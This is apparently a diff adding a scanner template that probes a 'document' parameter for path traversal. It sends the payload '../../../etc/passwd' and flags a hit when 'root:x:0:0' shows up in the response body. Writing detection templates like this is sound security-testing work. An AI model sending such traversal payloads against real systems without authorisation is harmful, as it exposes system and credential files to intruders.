@@ -1,0 +1,20 @@
+id: lfi6-0296
+name: 'Traversal in document'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via document'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      document:
+        - '../../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
